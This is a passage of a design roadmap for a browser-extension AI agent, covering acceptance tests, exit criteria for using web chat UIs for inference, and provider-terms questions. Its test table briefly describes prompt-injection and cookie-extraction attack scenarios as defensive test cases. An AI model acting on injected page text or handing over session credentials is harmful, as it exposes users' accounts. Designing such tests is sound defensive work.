be used (data and proposal, never executable instruction); and its acceptance
criteria, since §87 cannot apply.

Consequences:

- The specification stops being silent, so implementation has something to be
  measured against — the current position's real weakness.
- The amendment must be versioned and recorded; the committed file must not be
  edited in place, or the repository loses its document of record.
- Terms exposure remains and is **not** resolved by amending our own
  specification. Option B without verified provider terms changes nothing about
  the actual risk.
- A third provider class that cannot satisfy §87 needs its own acceptance
  definition, or §84/§99 certification becomes ambiguous for it.

### A third framing the owner may prefer

§42 already supports reading web interaction as _browser automation of target
sites_ and never as an inference path. That is Option A plus an explicit
statement, and it has the advantage of being what the specification most
naturally says today.

---

## 24. Full Parity Certification Roadmap

§99 permits the parity claim only when every P-001…P-040 capability has
implementation, test evidence, security validation, and documented limitations.
§84 additionally requires a **manual acceptance test** per capability — a
condition currently unmet repository-wide, as `PARITY_MATRIX.md` states.

Certification therefore requires, at minimum: Waves C, F, G, H and I complete;
§85 A–F executed (D and E need connectors, F needs three providers); §86
security acceptance; §87 per provider; §88 per connector; §89 browser failure
acceptance; and §99 limitation documentation for anything Chrome makes
impossible.

Stage 3 does not produce certification. No wave short of J does.

---

## 24A. Acceptance Test Design (designed, not implemented)

Each row names the security invariant it protects, because a test that does not
protect an invariant is a test that can be quietly weakened.

| #   | Test                                | Preconditions                                                           | Action                           | Expected result                                                                                    | Security invariant                               | Evidence                                               |
| --- | ----------------------------------- | ----------------------------------------------------------------------- | -------------------------------- | -------------------------------------------------------------------------------------------------- | ------------------------------------------------ | ------------------------------------------------------ |
| A   | API provider                        | Configured API credential                                               | Run a task end to end            | Completes; capability doctor reported readiness first                                              | Credential never leaves the credential store     | Provider request/response, no credential in any record |
| B   | Web provider detection              | Provider tab open                                                       | Observe state                    | Provider identified from URL/origin only                                                           | No cookie, storage or header read                | Detected state + signal used                           |
| C   | Authentication required             | Not logged in                                                           | Agent needs the provider         | State `AUTHENTICATION_REQUIRED`; task pauses                                                       | No credential prompt shown by the extension      | Paused task with reason                                |
| D   | Human login                         | C reached                                                               | User logs in manually            | Extension performs no typing; no secret handled                                                    | Extension never enters a credential              | Timeline showing no agent input during login           |
| E   | Auth success detection              | D complete                                                              | Observe                          | `READY`; task resumes with prior work intact                                                       | Detection used permitted signals only            | State transition + signal                              |
| F   | Session expiry                      | `READY`, then session ends mid-task                                     | Continue                         | `SESSION_EXPIRED`; pause; partial work preserved; not confused with `ACCESS_DENIED`                | No silent retry of login                         | State transition + preserved task                      |
| G   | Provider unavailable                | Provider erroring/offline                                               | Attempt                          | `PROVIDER_UNAVAILABLE`; clean failure; no fallback to another provider                             | No silent provider fallback (§60)                | Error + refusal to substitute                          |
| H   | Web AI output provenance            | Reply read from DOM                                                     | Inspect the record               | Labelled `MODEL_OUTPUT_WEB_UI`, trust untrusted                                                    | Provenance immutable, assigned at admission      | Evidence with provenance, origin, tab, method          |
| I   | Prompt injection                    | Page carries instructions; AI repeats them                              | Run task                         | Repeated text is data; no tool call originates from it                                             | Untrusted provenance cannot originate a proposal | Both admissions recorded                               |
| J   | Credential extraction attempt       | Reply asks for cookies/tokens                                           | Run task                         | No capability exists to satisfy it; refused                                                        | Invariants in §4D                                | Refusal recorded as a security event                   |
| K   | High-risk tool proposal             | Reply proposes an R2/R3 action                                          | Run task                         | Re-classified and confirmed, or blocked; never auto-executed                                       | Authorisation never comes from model output      | Risk level + decision                                  |
| L   | Provider switching                  | Two providers configured                                                | Switch                           | Explicit; no silent fallback; capability change confirmed; no provider-private data carried across | Credential isolation across providers            | Switch record + capability delta                       |
| M   | Managed-device debugger restriction | Managed Chrome with `runtime_blocked_hosts` or `DisableScreenshots`/DLP | Invoke a debugger-dependent tool | Clear refusal naming the policy restriction; not a generic failure                                 | Degrade honestly, never silently                 | Policy error surfaced verbatim                         |
| N   | Production installation             | Packaged build from a supported channel                                 | Install as an ordinary user      | Installs and runs without Developer Mode                                                           | No unpacked-load assumption anywhere             | Install record + version                               |

Tests C, D, E, F and N require a human and cannot run unattended in CI —
authentication must not be automated and credentials must not be stored. They
belong in the manual acceptance procedure, alongside §85–§89. Tests H, I, J, K
and L are automatable and should be, since they guard the invariants.

---

## 24B. D4 and D5 Exit Criteria

Technical feasibility is **not** an exit criterion. D4 does not become
implementable because the architecture supports it.

### D4 — Web AI Inference. All eight must be closed.

| #   | Criterion                                                                                                                                       | Status                                      |
| --- | ----------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------- |
| 1   | Specification compatibility decision recorded — Option A or B (§23A)                                                                            | **OPEN** — owner                            |
| 2   | Provider terms verified verbatim for each provider to be enabled                                                                                | **OPEN** — egress-blocked                   |
| 3   | Authentication boundary: detection from permitted signals only, no secret access                                                                | **DESIGNED** (§4D) — not built              |
| 4   | Trust and provenance boundary, laundering prevented                                                                                             | **DESIGNED** (§4B) — not built              |
| 5   | Prompt-injection controls for all seven scenarios                                                                                               | **DESIGNED** (§4C) — not built              |
| 6   | Authorization boundary: untrusted provenance cannot originate a tool proposal                                                                   | **DESIGNED** (§4B, §4F) — not built         |
| 7   | **Data egress control closure (§4I) complete** — taint persisted, destinations declared, fail-closed default, consent modelled, egress evidence | **MET** — B2 implemented and verified (§4L) |
| 8   | Acceptance tests H, I, J, K defined and passing                                                                                                 | **DESIGNED** (§24A) — not built             |

### D5 — Provider-specific Enablement. D4 plus six, **per provider**.

| #   | Criterion                                                                                                                       |
| --- | ------------------------------------------------------------------------------------------------------------------------------- |
| 1   | That provider's terms verified individually — a decision about one says nothing about another                                   |
| 2   | Provider detection validated against the live site                                                                              |
| 3   | Authentication detection validated, including SSO and MFA paths                                                                 |
| 4   | UI reliability assessed and a change-detection strategy in place                                                                |
| 5   | Capability matrix filled with SUPPORTED / UNSUPPORTED / UNKNOWN / REQUIRES_PROVIDER_VALIDATION — never inferred from appearance |
| 6   | Failure and recovery tests: session expiry, access denied, provider unavailable, UI change                                      |

**UNKNOWN vs UNSUPPORTED:** UNSUPPORTED means tested and absent — the agent may
plan around it. UNKNOWN means untested — the agent must **not** plan around it
and must not offer it. Collapsing the two is how a capability gets assumed from
the look of a page.

---

## 24C. Implementation Dependency Order

**Foundation — none of it depends on the web-provider gate:**

1. Provider registry generalisation (`kind` discriminator) — no runtime change
2. Provider-neutral authentication state machine (§4E)
3. Provenance model and immutable labels (§4B) — strengthens today's injection defence on its own
4. **Data egress closure (§4I)** — persist taint with the task, declare
   `writeDestination` on every outbound path, generalise the destination model,
   pin web-provider output to `untrusted_external_content`, model consent as
   (task, destination), emit egress evidence. Fixes two verified defects and is
   a prerequisite of D4, connectors, MCP and plugins
5. Persistence and recovery for provider state — extends existing `TaskStore`
6. Production packaging, versioning, update path
7. Store submission preparation: permission justification, privacy disclosure

**Web provider — D1–D3 depend on foundation 1–3; D4–D5 additionally gated:**

8. D1 provider detection and registry entry → needs 1, 2
9. D2 authentication flow and human-in-the-loop pause → needs 2, 5
10. D3 UI interaction as an ordinary site → needs nothing new
11. D4 inference → needs 3, 4, **and the gate**
12. D5 provider-specific enablement → needs 11 plus per-provider validation

Items 1–7 are the recommended start. They are useful whatever the owner decides
about D4, and item 3 improves security regardless.

---

## 25. Explicitly Deferred Work

Deferred by this roadmap, with nothing started: connectors, skills, workflow,
recording, shortcuts, scheduling, MCP, plugins, additional provider adapters,
upload and download, unified audit export, advanced forms, authenticated web
providers, and store publication.

---

## 26. Future Stage Handoff

Implementation is not authorised by this document. Three questions need owner
decisions, and two of them gate Wave D entirely.

**Q1 — specification and terms. Gates D4 and D5 only.** Verdict:
**AMBIGUOUS — OWNER DECISION REQUIRED**. §3.3's method list is non-exhaustive
("Possible methods **include**"), so it does not categorically exclude web
inference; the operative test is whether the method is **provider-approved**,
which is a terms question this environment could not answer — every first-party
domain is egress-blocked. Two decisions:

1. **Per provider**, from an environment with egress: do the current consumer
   terms permit automated interaction with the web UI for inference, and
   automated extraction of Output? The one indication obtained — a
   search-derived summary of OpenAI's policies reporting a prohibition on
   programmatically extracting Output — is adverse and unverified.
2. **For the specification**: Option A (keep §3.3; inference via official APIs
   only) or Option B (explicit versioned amendment defining the Web AI provider
   class). §23A sets out the consequences of each. Not chosen here.

**Correctly framed question.** Not "does §3.3 permit Web AI?" — the method list
is illustrative and that framing invents an interpretive dispute about the word
"include". The operative question is: **does the proposed architecture satisfy
§3.3's operative requirements?** §3.3 states one requirement — authentication
must support only **provider-approved** methods — and six prohibitions.
Evaluated against the architecture in §4A-§4I:

| §3.3 clause                                  | Satisfied by construction?                                                                                                                                                           | Classification     |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------ |
| Never steal cookies                          | Yes — no cookie API is used or requested; not in `permissions`                                                                                                                       | ENGINEERING DESIGN |
| Never extract browser session tokens         | Yes — no storage/token read path; forbidden by the credential invariants                                                                                                             | ENGINEERING DESIGN |
| Never impersonate a provider                 | Yes — provider identity is displayed, never asserted on the provider's behalf                                                                                                        | ENGINEERING DESIGN |
| Never claim a subscription grants API access | Yes — Web AI is a separate provider class, never presented as API access                                                                                                             | ENGINEERING DESIGN |
| A user identity is not model/API entitlement | Yes — authentication, authorization, entitlement and automation permission are four distinct gates                                                                                   | ENGINEERING DESIGN |
| Never scrape undocumented provider APIs      | **Undetermined.** DOM automation of a rendered UI is not literally an API scrape, but it is the same channel by another name                                                         | TERMS UNVERIFIED   |
| Never bypass subscription/API boundaries     | **Undetermined.** No entitlement is escalated — the user is already entitled to the web UI — but if terms prohibit automated access, automation crosses a boundary the provider drew | TERMS UNVERIFIED   |
| Authentication must be **provider-approved** | **Undetermined.** The operative requirement. Answerable only from provider terms                                                                                                     | TERMS UNVERIFIED   |

Five prohibitions are satisfiable by construction and verifiable in code. Three
clauses — the operative requirement and the two boundary prohibitions — turn on
provider terms, not on reading the specification. Their status is
**TERMS UNVERIFIED**, which is distinct from an owner decision: no amount of
owner judgement substitutes for the terms text. The owner decision that does
remain is Option A vs Option B, and it only becomes live once the terms are read.

Credential handling and access-control bypass are not in dispute under either
outcome: the architecture never reads a credential store, never converts a
session into a credential, and never bypasses MFA, CAPTCHA, SSO or OAuth
consent. Those hold regardless of how the terms resolve.

**Q2 — closed.** §30 enumerates `web pages` among untrusted external content,
so model output read from a DOM is untrusted data, never instructions, and
§30's "origin tagging" and "trust classification" make the provenance model a
specification requirement. Level 3 — executable tool instruction from DOM
output — is unsafe under the current model and must not be built.

**Q3 — distribution.** Public or unlisted first; and is `debugger` retained
through review, or split into production and diagnostic builds? Note this is
not only a review question: from Chrome 155 the permission can be blocked by
enterprise policy regardless of review outcome.

**Available now: Waves A, B, C, D1, D2, D3.** Gated: D4, D5.

Waves A, B, C and D1–D3 are implemented. D4 and D5 remain gated on Q1.
